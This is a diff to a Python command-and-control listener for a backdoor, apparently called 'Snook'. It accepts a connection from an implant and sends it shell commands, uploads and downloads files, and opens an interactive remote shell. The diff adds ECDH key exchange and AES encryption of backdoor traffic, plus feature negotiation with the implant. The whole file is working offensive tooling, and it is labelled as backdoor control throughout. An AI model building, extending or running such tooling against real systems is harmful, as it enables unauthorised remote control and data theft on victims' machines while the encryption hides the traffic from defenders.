@@ -7,14 +7,30 @@ from cmd import Cmd
 from glob import glob
 from json import dumps, JSONDecodeError, loads
 import logging
+import os
 from os.path import abspath, getsize, isdir, join
 from ntpath import basename
 from readline import get_completer_delims, set_completer_delims
+from select import select
 from shlex import split
 from socket import AF_INET, SHUT_RDWR, socket, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+from struct import pack, unpack
+from sys import stdin
+import termios
+from threading import Thread
+from typing import Tuple
 
 from alive_progress import alive_bar
 from colorama import Fore, init
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes, padding, serialization
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+
+
+# TODO: encrypt command with on/off switch
+# TODO: Add a command parameter on interactive command
 
 
 # Little trick to enable correct path autocompletion on Unix
@@ -23,11 +39,7 @@ set_completer_delims(old_delims.replace('/', ''))
 
 logger = logging.getLogger('Snook')
 
-
-class SilentArgumentParser(ArgumentParser):
-
-    def error(message):
-        self.exit(2)
+stop_interactive_mode=False
 
 
 class Packet():
@@ -40,17 +52,19 @@ class Packet():
         self.error = None
         self.path = None
 
-    def add_argument(self, name, value):
+    def add_argument(self, name: str, value, base64_enc: bool=True) -> None:
+        if isinstance(value, str) and base64_enc:
+            value = b64encode(value.encode('utf-8')).decode('utf-8')
         self._args[name] = value
 
-    def dumps(self):
+    def dumps(self) -> str:
         return dumps({'action': self.action, 'args': self._args})
 
-    def get_argument(self, name):
+    def get_argument(self, name: str):
         return self._args.get(name)
 
     @staticmethod
-    def loads(data):
+    def loads(data: str) -> 'Packet':
         p = Packet()
         data = loads(data)
         p.action = data.get('action', '')
@@ -58,21 +72,107 @@ class Packet():
         p.message = b64decode(data.get('message', '')).decode('utf-8')
         p.warning = b64decode(data.get('warning', '')).decode('utf-8')
         p.error = b64decode(data.get('error', '')).decode('utf-8')
-        p.cwd = b64decode(data.get('cwd', '')).decode('utf-8')
+        p.prompt = b64decode(data.get('prompt', '')).decode('utf-8')
         return p
+
+
+def decrypt_data(data: bytes, key: bytes, iv: bytes) -> bytes:
+    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv),
+        backend=default_backend()).decryptor()
+    decrypted = decryptor.update(data) + decryptor.finalize()
+    unpadder = padding.PKCS7(128).unpadder()
+    return unpadder.update(decrypted) + unpadder.finalize()
+
+
+def encrypt_data(data: bytes, key: bytes) -> Tuple[bytes, bytes]:
+    iv = os.urandom(16)
+    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv),
+        backend=default_backend()).encryptor()
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    return encryptor.update(padded_data) + encryptor.finalize(), iv
+
+
+def interactive_mode_read(sock: socket, key: bytes=None) -> None:
+    while True:
+        if select([stdin], [], [])[0]:
+            if stop_interactive_mode:
+                break
+            data = os.read(0, 1024)
+            send_packet(sock, data, key)
+
+
+def interactive_mode_write(sock: socket, key: bytes=None) -> None:
+    global stop_interactive_mode
+
+    while True:
+        data = receive_packet(sock, key)
+        if data[0] == 0xbb:
+            stop_interactive_mode = True
+            sock.send(b'\x00\x00\x00\x00')
+            break
+        os.write(1, data[1:])
+
+
+def receive_packet_size(sock: socket) -> int:
+    received_bytes = b''
+    while len(received_bytes) < 4:
+        received_bytes += sock.recv(4 - len(received_bytes))
+    return unpack('>I', received_bytes)[0]
+
+
+def receive_data(sock: socket, size: int) -> bytes:
+    received_bytes = b''
+    while len(received_bytes) < size:
+        received_bytes += sock.recv(size - len(received_bytes))
+    return received_bytes
+
+
+def receive_packet(sock: socket, key: bytes=None) -> bytes:
+    size = receive_packet_size(sock)
+    if key:
+        iv = receive_data(sock, 16)
+    message = receive_data(sock, size)
+
+    if key:
+        message = decrypt_data(message, key, iv)
+
+    return message
+
+
+def send_packet(sock: socket, data: bytes, key: bytes=None) -> None:
+    if key:
+        data, iv = encrypt_data(data, key)
+    size = pack('>I', len(data))
+
+    sock.send(size)
+    if key:
+        sock.send(iv)
+    sock.send(data)
+
+
+class SilentArgumentParser(ArgumentParser):
+
+    def error(message: str):
+        self.exit(2)
 
 
 class Prompt(Cmd):
     intro = ''
     prompt = ''
 
-    def __init__(self, client_sock):
+    def __init__(self, client_sock: socket, enable_encryption: bool):
         super().__init__()
         self.task_args = None
         self.sock = client_sock
-        self.receive_loop()
+        self.aes_key = None
+        self.enable_encryption = enable_encryption
+        self.features = ('download', 'interactive', 'upload')
+        self.receive_packet()
+        print('')
 
-    def cmdloop(self, intro=None):
+        
+    def cmdloop(self, intro: str=None):
         while True:
             try:
                 super().cmdloop(intro=intro)
@@ -80,7 +180,7 @@ class Prompt(Cmd):
             except KeyboardInterrupt:
                 print('^C')
 
-    def complete_download(self, text, line, begidx, endidx):
+    def complete_download(self, text: str, line: str, begidx: int, endidx: int) -> list:
         parser = SilentArgumentParser()
         parser.add_argument('file', nargs='?', type=str)
         parser.add_argument('-d', '--destination', type=str)
@@ -98,7 +198,7 @@ class Prompt(Cmd):
 
         return paths
 
-    def complete_upload(self, text, line, begidx, endidx):
+    def complete_upload(self, text: str, line: str, begidx: int, endidx: int) -> list:
         parser = SilentArgumentParser()
         parser.add_argument('file', type=str)
         parser.add_argument('-d', '--destination', type=str)
@@ -116,7 +216,14 @@ class Prompt(Cmd):
 
         return paths
 
-    def do_download(self, line):
+    def default(self, line: str):
+        logger.debug(f'Running command: {line}')
+        p = Packet()
+        p.add_argument('cmd', line)
+        self.send_packet(p)
+        return self.receive_packet()
+
+    def do_download(self, line: str):
         parser = ArgumentParser(prog='download',
             description='Download file from remote host')
         parser.add_argument('file', type=str,
@@ -132,7 +239,7 @@ class Prompt(Cmd):
             parser.print_usage()
             return
 
-        logger.debug('Running command: download {}'.format(line))
+        logger.debug(f'Running command: download {line}')
 
         self.task_args = args
 
@@ -140,18 +247,49 @@ class Prompt(Cmd):
         p.action = 'download'
         p.add_argument('path', args.file)
         self.send_packet(p)
-        return self.receive_loop()
+        return self.receive_packet()
 
-    def do_EOF(self, line):
-        return self.do_exit()
+    def do_EOF(self, line: str):
+        return self.do_exit('EOF')
 
-    def do_exit(self, line=''):
-        logger.debug('Running command: {}'.format(line))
+    def do_exit(self, line: str=''):
+        logger.debug(f'Running command: {line}')
         self.sock.shutdown(SHUT_RDWR)
         self.sock.close()
         return True
 
-    def do_upload(self, line):
+    def do_interactive(self, line: str):
+        global stop_interactive_mode
+
+        logger.debug('Running command: interactive')
+
+        p = Packet()
+        p.action = 'interactive'
+        self.send_packet(p)
+
+        # Put terminal into raw mode
+        flags = termios.tcgetattr(stdin)
+        flags_copy = flags[:]
+        flags[3] = flags[3] & ~(termios.ECHO | termios.ICANON | termios.ISIG)
+        termios.tcsetattr(stdin, termios.TCSAFLUSH, flags)
+        
+        stop_interactive_mode = False
+
+        read_thread = Thread(target=interactive_mode_read,
+            args=(self.sock, self.aes_key))
+        write_thread = Thread(target=interactive_mode_write,
+            args=(self.sock, self.aes_key))
+
+
+        read_thread.start()
+        write_thread.start()
+
+        write_thread.join()
+
+        # Set back terminal to cook mode
+        termios.tcsetattr(stdin, termios.TCSAFLUSH, flags_copy)
+
+    def do_upload(self, line: str):
         parser = ArgumentParser(prog='upload',
             description='Upload file to remote host')
         parser.add_argument('file', type=str,
@@ -178,21 +316,32 @@ class Prompt(Cmd):
             self.print_error(str(e))
             return
 
-        logger.debug('Running command: upload {}'.format(line))
+        logger.debug(f'Running command: upload {line}')
 
         p.add_argument('dest', args.destination)
         p.add_argument('filename', basename(args.file))
         self.send_packet(p)
-        return self.receive_loop()
+        return self.receive_packet()
 
-    def default(self, line):
-        logger.debug('Running command: {}'.format(line))
-        p = Packet()
-        p.add_argument('cmd', b64encode(line.encode('utf-8')).decode('utf-8'))
-        self.send_packet(p)
-        return self.receive_loop()
+    def generate_ecdh_key_pair(self) -> Tuple[ec.EllipticCurvePrivateKey,
+                                              ec.EllipticCurvePublicKey]:
+        private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
+        return private_key, private_key.public_key()
 
-    def handle_default(self, packet):
+    def generate_encryption_key(self, private_key: ec.EllipticCurvePrivateKey,
+                                backdoor_public_key: ec.EllipticCurvePublicKey) -> bytes:
+        shared_key = private_key.exchange(ec.ECDH(), backdoor_public_key)
+        derived_key = HKDF(
+            algorithm=hashes.SHA256(),
+            length=16,
+            salt=None,
+            info=b'',
+            backend=default_backend()
+        ).derive(shared_key.hex().encode())
+
+        return derived_key
+
+    def handle_default(self, packet: Packet):
         if packet.message:
             self.print_message(packet.message)
         if packet.warning:
@@ -200,7 +349,7 @@ class Prompt(Cmd):
         if packet.error:
             self.print_error(packet.error)
 
-    def handle_download(self, packet):
+    def handle_download(self, packet: Packet):
         if packet.error:
             self.print_error(packet.error)
             return
@@ -214,11 +363,10 @@ class Prompt(Cmd):
         else:
             file_path = self.task_args.destination
 
-        self.sock.send(b'GO')
         with alive_bar(file_size) as bar:
             with open(file_path, 'wb') as f:
                 while received_bytes < file_size:
-                    data = self.sock.recv(1024)
+                    data = receive_packet(self.sock, self.aes_key)
                     if not data:
                         return self.do_exit()
 
@@ -226,9 +374,45 @@ class Prompt(Cmd):
                     received_bytes += len(data)
                     bar(incr=len(data))
 
-        self.print_message('File successfully saved to {}'.format(abspath(file_path)))
+        self.print_message(f'File successfully saved to {abspath(file_path)}')
 
-    def handle_upload(self, packet):
+    def handle_hello(self, packet: Packet):
+        self.backdoor_features = packet.get_argument('features')
+        backdoor_encryption = packet.get_argument('encryption')
+        if not backdoor_encryption['supported']:
+            self.print_warning('Communication encryption is not supported by the backdoor.')
+            return
+
+        if not backdoor_encryption['enabled']:
+            self.print_warning('Communication encryption is disabled by the backdoor.')
+            return
+
+        res = Packet()
+        res.action = 'hello'
+        if self.enable_encryption:
+            pr, pb = self.generate_ecdh_key_pair()
+            pb_bytes = pb.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            )
+            encryption = {'enabled': True, 'pbkey': b64encode(pb_bytes).decode('utf-8')}
+        else:
+            encryption = {'enabled': False}
+        res.add_argument('encryption', encryption)
+        self.send_packet(res)
+
+        if self.enable_encryption:
+            backdoor_public_key = serialization.load_pem_public_key(
+                b64decode(backdoor_encryption['pbkey']),
+                backend=default_backend()
+            )
+
+            self.aes_key = self.generate_encryption_key(pr, backdoor_public_key)
+            self.print_message('Communication encryption enabled.')
+        else:
+            self.print_warning('Communication encryption is disabled by the listener.')
+
+    def handle_upload(self, packet: Packet):
         if packet.error:
             self.print_error(packet.error)
             return
@@ -238,68 +422,58 @@ class Prompt(Cmd):
         with alive_bar(file_size) as bar:
             with open(self.task_args.file, 'rb') as f:
                 while True:
-                    data = f.read(1024)
+                    data = f.read(4096)
                     if not data:
                         break
-                    self.sock.send(data)
+                    self.send_data(data)
                     bar(incr=len(data))
 
 
-        p = self.receive_json_packet()
-        if not isinstance(p, Packet):
-            return p
+        p = Packet.loads(receive_packet(self.sock, self.aes_key))
 
-        self.print_message('File successfully uploaded to {}'.format(p.message))
+        self.print_message(f'File successfully uploaded to {p.message}')
 
-    def print_error(self, text):
-        logger.error(Fore.RED + text + Fore.RESET)
+    def onecmd(self, s: str):
+        if s in self.features and s not in self.backdoor_features:
+            self.print_message(f'{s} is not supported by the backdoor.')
+            return False
+        else:
+            return super().onecmd(s)
 
-    def print_message(self, text):
-        logger.info(text)
+    def remove_trailing_line_break(self, s: str) -> str:
+        if s[-1] == '\n':
+            s = s[:-1]
+        return s
 
-    def print_warning(self, text):
-        logger.warning(Fore.YELLOW + text + Fore.RESET)
+    def print_error(self, text: str) -> None:
+        logger.error(Fore.RED + self.remove_trailing_line_break(text) + Fore.RESET)
 
-    def receive_json_packet(self):
-        # TODO: Find a better mechanism for this function that can
-        # return a Packet, True or None
-        response = ''
-        while True:
-            data = self.sock.recv(1024)
-            if not data:
-                return self.do_exit()
+    def print_message(self, text: str) -> None:
+        logger.info(self.remove_trailing_line_break(text))
 
-            response += data.decode('utf-8')
-            try:
-                p = Packet.loads(response)
-            except JSONDecodeError as e:
-                continue
-            except Exception as e:
-                logger.error('An unexcepted error happened:', e)
-                return None
+    def print_warning(self, text: str) -> None:
+        logger.warning(Fore.YELLOW + self.remove_trailing_line_break(text) + Fore.RESET)
 
-            break
-
-        return p
-
-    def receive_loop(self):
-        p = self.receive_json_packet()
-        if not isinstance(p, Packet):
-            return p
+    def receive_packet(self):
+        p = Packet.loads(receive_packet(self.sock, self.aes_key))
 
         try:
             f = getattr(self, 'handle_' + p.action)
         except AttributeError:
             f = getattr(self, 'handle_default')
 
-        if p.cwd:
-            self.prompt = 'PS {}> '.format(p.cwd)
+        if p.prompt:
+            self.prompt = f'{p.prompt} '
+
         return f(p)
 
-    def send_packet(self, packet):
-        self.sock.send(packet.dumps().encode('utf-8'))
+    def send_data(self, data: bytes) -> None:
+        send_packet(self.sock, data, self.aes_key)
 
-    def split_line_for_completion(self, line):
+    def send_packet(self, packet: Packet) -> None:
+        send_packet(self.sock, packet.dumps().encode('utf-8'), self.aes_key)
+
+    def split_line_for_completion(self, line: str) -> list:
         """ 
         Split a command line like a shell would do but still keep
         empty arguments (i.e. two spaces in a row) to enable autocompletion       
@@ -317,6 +491,8 @@ if __name__ == '__main__':
         help='Local port to bind to (default: 1337)')
     parser.add_argument('-l', '--log', nargs='?', type=str,
         help='Path to the file where to log commands and outputs')
+    parser.add_argument('-n', '--no-encryption', action='store_true',
+        help="Disable communication's encryption with the backdoor")
     args = parser.parse_args()
 
     # Setup logger
@@ -345,11 +521,11 @@ if __name__ == '__main__':
         server_address = (args.host, args.port)
         sock.bind(server_address)
         sock.listen()
-        logger.info('Listening on {}:{}'.format(*server_address))
+        logger.info(f'Listening on {server_address[0]}:{server_address[1]}')
         client_socket, client_address = sock.accept()
 
-        logger.info('Received connection from {}:{}\n'.format(*client_address))
-        prompt = Prompt(client_socket)
+        logger.info(f'Received connection from {client_address[0]}:{client_address[1]}')
+        prompt = Prompt(client_socket, not args.no_encryption)
         prompt.cmdloop()
     except Exception as e:
         logger.exception(e)
